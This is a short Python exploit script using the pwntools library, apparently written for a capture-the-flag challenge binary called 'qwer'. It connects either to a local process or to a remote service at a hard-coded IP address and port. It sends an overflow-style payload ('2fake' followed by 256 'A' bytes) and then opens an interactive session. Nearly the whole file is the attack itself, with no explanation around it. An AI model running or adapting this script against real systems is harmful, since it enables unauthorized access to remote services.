#!/usr/bin/env python3
from pwn import *
exe = ELF("./qwer", checksec=False)
context.binary=exe
def conn():
    if args.REMOTE:
        r = remote("36.50.177.41", 50002)
        
    else:
        r = process([exe.path])
    return r
r = conn()
input()

time.sleep(1)
payload = b'2fake' + b'A'*8*32
r.sendline(payload)
# pause()
r.interactive()